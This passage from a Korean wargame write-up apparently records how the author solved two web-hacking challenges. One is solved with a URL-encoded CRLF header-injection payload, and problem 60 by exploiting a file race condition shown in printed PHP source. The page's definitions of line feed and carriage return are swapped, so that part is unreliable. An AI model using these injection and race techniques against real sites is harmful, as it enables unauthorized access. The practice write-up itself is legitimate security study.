<li>문제에서 id=sgs04023 쿠키를 생성하라고 힌트를 준것으로 보고서..<ul>
<li>처음에 ?id=sgs04023 Set-Cookie: sgs04023 이렇게 적고 필터링을 우회하려고 시도했다.</li>
<li>?id=sgs04023%0A%0DSet-Cookie:%20sgs04023했다가 안먹혔고...</li>
<li>또 그냥 ?id=Set-Cookie: id=sgs04023이렇게 생각해서 역시 필터링을 우회하려고 시도해봤다.</li>
<li>?id=%0DSet-Cookie:%20id=sgs04023했다가 이상하게도 인터넷이 분명 잘 통하는게 분명한데 '페이지 로딩이 잠시 지연되었습니다. 인터넷 접속상태 확인 후 다시 시도하여 주시기 바랍니다.'라는 이상한 페이지가 자꾸 떴다.</li>
</ul>
</li>
<li>그 밖에도 여러가지 뻘짓들을 하다가 알아낸 정답은..<ul>
<li>?id=sgs04023 clear: sgs04023이라는 간단한...후우... 힌트를 더 명확하게 살폈더라면 간단히 풀 수 있었을 것 같았다.</li>
<li>그래서 저것 역시 필터링을 우회하면 ?id=sgs04023%0D%0Aclear:%20sgs04023이 된다.</li>
</ul>
</li>
</ol>
<h4 id="_1">추가적으로...<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h4>
<ul>
<li>필터링 우회를 구글링하다가 다같이 공유하면 좋을듯해서 올리는 몇가지 안되는 것들..</li>
<li>개행문자</li>
<li>Line Feed('\n', 0x0A, %0A): (커서가) 한줄 끝에서 시작 위치로 돌아가는 것 (기존 문장은 삭제)</li>
<li>Carrige Return ('\r', 0x0D, %0D): (커서가) 다음 줄로 이동</li>
<li>공백 ' ', %20: 공백</li>
</ul>
<h3 id="60">60번 문제<a class="headerlink" href="#60" title="Permanent link">&para;</a></h3>
<ul>
<li>문제를 클릭하면 <code>소스</code> 페이지가 링크 되어있다.</li>
</ul>
<blockquote>
<p>Access Denied</p>
<p>index.phps</p>
</blockquote>
<ul>
<li>소스를 보면 (소스가 길기 때문에 나눠서 해석.)</li>
</ul>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?</span>
<span class="nb">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;[0-9]&quot;</span><span class="p">,</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="nx">PHPSESSID</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">&quot;Access Denied&lt;br&gt;&lt;a href=index.phps&gt;index.phps&lt;/a&gt;&quot;</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">mode</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;auth&quot;</span><span class="p">)</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Auth~&lt;br&gt;&quot;</span><span class="p">);</span>
    <span class="nv">$f</span><span class="o">=@</span><span class="nb">file</span><span class="p">(</span><span class="s2">&quot;readme/</span><span class="si">$_SESSION[id]</span><span class="s2">.txt&quot;</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
        <span class="nv">$result</span><span class="o">.=</span><span class="nv">$f</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
        <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$_SESSION[id]</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$result</span><span class="p">))</span>
    <span class="p">{</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Done!&quot;</span><span class="p">);</span>
    <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;readme/</span><span class="si">$_SESSION[id]</span><span class="s2">.txt&quot;</span><span class="p">);</span>
    <span class="o">@</span><span class="nx">clear</span><span class="p">();</span>
    <span class="k">exit</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

<ul>
<li><code>sleep</code> 는 지연시키는 함수.</li>
<li><code>sleep(1)</code>은 1초를 지연시킨다라는 의미.</li>
<li><code>eregi</code>는 문자를 찾는 함수.</li>
<li><code>COOKIE(PHPSESSID)</code>값이 0~9일 경우 <code>Access Denied</code> 출력.</li>
<li>if문 보면 <code>mode</code>값이 <code>auth</code>일 경우 <code>Auth~</code> 라고 출력하고 <code>f</code>에 <code>readme/$_SESSION[id].txt</code>를 저장한다.</li>
<li>그다음 for문에서 <code>result</code>에 <code>txt</code> 내용 을 저장.</li>
<li>그다음 if문은 <code>$_SESSION[id]</code>의 값이 <code>result</code>에 있으면 <code>Done</code>을 출력하고 <code>unlink</code>를 호출해 <code>txt</code>파일을 삭제한다.</li>
<li>
<p>그러면 문제 <code>clear</code>.</p>
</li>
<li>
<p>일단 <code>EditThisCookie</code>를 사용해 쿠키값에 들어있는 숫자를 다 지워본다.</p>
</li>
<li>그 후 <code>새로고침</code>하면</li>
</ul>
<blockquote>
<p>login plz</p>
</blockquote>
<ul>
<li>다시 <code>로그인</code>해서 접속하면</li>
</ul>
<blockquote>
<p>hi</p>
</blockquote>
<ul>
<li>첫번째 if문대로 주소 끝에 <code>?mode=auth</code>를 입력해본다.</li>
</ul>
<blockquote>
<p>Auth~</p>
<p>hi</p>
</blockquote>
<ul>
<li>위처럼 출력되었지만 <code>Done</code>은 출력되지 않음.</li>
<li>이 결과는 두번째 if문 성립조건을 충족하지 못했다는 것.</li>
<li>
<p><code>txt</code>파일이 없어 result에 저장 되지 않은 것이다.</p>
</li>
<li>
<p>남은 소스를 보면</p>
</li>
</ul>
<div class="codehilite"><pre><span></span><span class="x">$f=@fopen(&quot;readme/$_SESSION[id].txt&quot;,&quot;w&quot;);</span>
<span class="x">@fwrite($f,&quot;$_SESSION[id]&quot;);</span>
<span class="x">@fclose($f);</span>

<span class="x">if($_SERVER[REMOTE_ADDR]!=&quot;127.0.0.1&quot;)</span>
<span class="x">{</span>
<span class="x">sleep(1);</span>
<span class="x">@unlink(&quot;readme/$_SESSION[id].txt&quot;);</span>
<span class="x">}</span>

<span class="x">?&gt;</span>
</pre></div>

<ul>
<li><code>fopen</code>을 사용해 <code>txt</code>파일을 만들어 <code>f</code>에 저장.</li>
<li><code>fwrite</code>을 통해 <code>f</code>에 저장된 내용을 <code>$_SESSION[id]</code>에 저장한다.</li>
<li>마지막 if문을 보면 <code>ip주소</code>과 <code>127.0.0.1</code>과 다를 경우,</li>
<li>1초를 지연하고 파일을 삭제 <code>unlink</code>한다.</li>
<li>그러면 파일이 삭제되기 전에 <code>clear</code>해야한다.</li>
<li>구글 검색결과, 다른 브라우저 두개를 사용해서 문제를 해결해야한다.</li>
<li>쿠키값을 수정한 후 들어오는 순간 if문이 실행되기 때문에,</li>
<li>한 브라우저는 파일 생성용, 나머지는 문제해결용으로 사용한다.</li>
<li><code>Chrome</code>과 <code>Internet Explorer</code>를 사용했다.</li>
<li>두 브라우저로 문제를 접속한 후 쿠키값을 바꾼다.</li>
<li>이 때 서로의 쿠키값을 달라야한다.</li>
<li>또 쿠키값은 문자로만 이루어져야한다.</li>
<li><code>Internet Explorer</code>의 쿠키값 먼저 변경해주고 다시 로그인해서 접속한 후</li>
<li>주소창 맨 끝에 <code>?mode=auth</code>을 입력만 해주었다. (<code>Enter</code> 누르기 전)</li>
<li>그 다음 <code>Chrome</code>의 쿠키값을 변경하고 다시 로그인해서 접속해서 <code>hi</code> 확인</li>
<li><code>Internet Explorer</code>로 넘어와 <code>Enter</code> 누르고 재빠르게 <code>Chrome</code> 새로고침.</li>
<li>
<p>이것을 반복하다 보면 문제해결.</p>
</li>
<li>
<p>이 문제는 <code>레이스컨디션</code>을 이용해서 푸는 문제.</p>
</li>
<li><code>레이스컨디션</code> = 프로세스가 서로 경쟁하는 것.</li>
</ul>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../webhacking-week1to3/" title="1주차 ~ 3주차" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                1주차 ~ 3주차
              </span>
            </div>
          </a>
        
        
          <a href="../../docker-study/" title="Docker Study" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Docker Study
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="http://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
        
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../assets/javascripts/application.8eb9be28.js"></script>
      
      <script>app.initialize({version:"0.17.3",url:{base:"../../.."}})</script>
      
    
    
      
    
  </body>
</html>